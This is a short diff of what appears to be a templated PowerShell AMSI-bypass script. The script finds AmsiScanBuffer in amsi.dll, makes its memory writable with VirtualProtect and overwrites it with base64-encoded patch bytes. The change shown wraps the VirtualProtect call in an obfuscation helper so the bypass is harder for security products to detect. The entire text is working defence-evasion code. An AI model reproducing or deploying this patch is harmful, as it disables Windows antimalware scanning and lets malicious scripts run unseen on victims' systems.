@@ -29,7 +29,7 @@ Add-Type ${{symbol_name("Win32")}}
 
 ${{symbol_name("address")}} = [{{symbol_name("Win32")}}]::{{obfuscate("GetProcAddress")}}([{{symbol_name("Win32")}}]::{{obfuscate("LoadLibrary")}}({{obfuscate("amsi.dll")}}), {{obfuscate("AmsiScanBuffer")}})
 ${{symbol_name("nullpointer")}} = 0
-[{{symbol_name("Win32")}}]::VirtualProtect(${{symbol_name("address")}}, [uint32]5, 0x40, [ref]${{symbol_name("nullpointer")}})
+[{{symbol_name("Win32")}}]::{{obfuscate("VirtualProtect")}}(${{symbol_name("address")}}, [uint32]5, 0x40, [ref]${{symbol_name("nullpointer")}})
 ${{symbol_name("bytes")}} = {{obfuscate("uFcAB4DD")}}
 ${{symbol_name("patch")}} = [System.Convert]::{{obfuscate("FromBase64String")}}(${{symbol_name("bytes")}})
 [System.Runtime.InteropServices.Marshal]::{{obfuscate("Copy")}}(${{symbol_name("patch")}}, 0, ${{symbol_name("address")}}, 6)
